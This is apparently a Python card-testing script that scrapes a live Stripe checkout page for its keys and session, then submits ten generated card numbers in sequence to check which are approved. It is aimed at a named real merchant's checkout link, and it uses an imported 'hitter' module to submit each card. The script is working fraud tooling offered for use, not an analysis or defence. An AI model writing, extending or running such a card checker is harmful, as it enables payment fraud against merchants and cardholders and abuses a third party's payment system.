import sys
import json
import asyncio
import aiohttp
from hitter_core import StripeAPIHitter, StripeAPIExtractor

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

CARDS = [
    "4154644402330002|05|2028|378",
    "4154644402330011|05|2028|378",
    "4154644402330020|05|2028|378",
    "4154644402330039|05|2028|378",
    "4154644402330048|05|2028|378",
    "4154644402330057|05|2028|378",
    "4154644402330066|05|2028|378",
    "4154644402330075|05|2028|378",
    "4154644402330084|05|2028|378",
    "4154644402330093|05|2028|378",
]

async def run_single_card(url: str, card_str: str, index: int):
    parts = card_str.split("|")
    card_dict = {
        "card": parts[0],
        "mm": parts[1],
        "yy": parts[2],
        "cvv": parts[3]
    }
    
    async with aiohttp.ClientSession() as sess:
        hdr = {"User-Agent": UA, "Accept": "text/html,*/*"}
        async with sess.get(url, headers=hdr, timeout=12) as r:
            html = await r.text()
            final_url = str(r.url)

        cs_live = StripeAPIExtractor.extract_cs_live(final_url, html)
        pk_live = StripeAPIExtractor.extract_pk_live(html)

        hash_info = StripeAPIExtractor.extract_details_from_url_hash(url)
        hash_pk = hash_info.get('pk_key')
        stripe_account = hash_info.get('stripe_account')
        if hash_pk and hash_pk.startswith('pk_live_'):
            pk_live = hash_pk

        if not cs_live or not pk_live:
            print(f"[{index+1}/10] ERROR: Extraction failed cs={bool(cs_live)} pk={bool(pk_live)}")
            return None

        init_json = {}
        if cs_live.startswith('cs_'):
            try:
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
                init_data = f"key={pk_live}&eid=NA&browser_locale=en-US"
                if stripe_account:
                    init_data += f"&account={stripe_account}"
                hdr_init = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
                async with sess.post(init_url, data=init_data, headers=hdr_init, timeout=8) as ir:
                    init_json = await ir.json()
                    if not isinstance(init_json, dict):
                        init_json = {}
            except Exception:
                pass

        locked_email = None
        if init_json:
            locked_email = (
                init_json.get('customer_email')
                or init_json.get('prefilled_email')
                or init_json.get('email')
                or (init_json.get('customer') or {}).get('email')
                or (init_json.get('customer_details') or {}).get('email')
            )

        ts = init_json.get('total_summary') if init_json else None
        raw_amount = ts.get('total') if isinstance(ts, dict) else None
        if raw_amount is None and init_json:
            raw_amount = (
                (init_json.get('invoice') or {}).get('amount_due')
                or (init_json.get('payment_intent') or {}).get('amount')
            )

        striker = StripeAPIHitter(
            pk_live=pk_live,
            cs_live=cs_live,
            proxy_data=None,
            raw_amount=raw_amount,
            locked_email=locked_email,
            stripe_account=stripe_account,
            init_json=init_json,
        )

        res = await striker.hit(card_dict, attempt=1, user_id=0)
        
        status_symbol = "APPROVED" if res.get('success') else ("3DS CHALLENGE" if res.get('decline_code') == 'requires_action' else f"DECLINED ({res.get('decline_code')})")
        
        print(f"[{index+1:02d}/10] {card_str} -> {status_symbol} | time={res.get('response_time', 0):.2f}s | merchant={res.get('merchant')} | amount={res.get('amount')}")
        return res

async def main():
    if len(sys.argv) < 2:
        print("Usage: python sweep_runner.py <url>")
        return
    url = sys.argv[1]
    print(f"=== STARTING 10-CARD SWEEP FOR WISPR.AI LINK ===")
    print(f"Target URL: {url[:80]}...\n")
    
    results = []
    for idx, card in enumerate(CARDS):
        res = await run_single_card(url, card, idx)
        results.append(res)
        await asyncio.sleep(1) # clean 1s gap between hits

    print("\n=== SWEEP COMPLETED ===")

if __name__ == '__main__':
    asyncio.run(main())
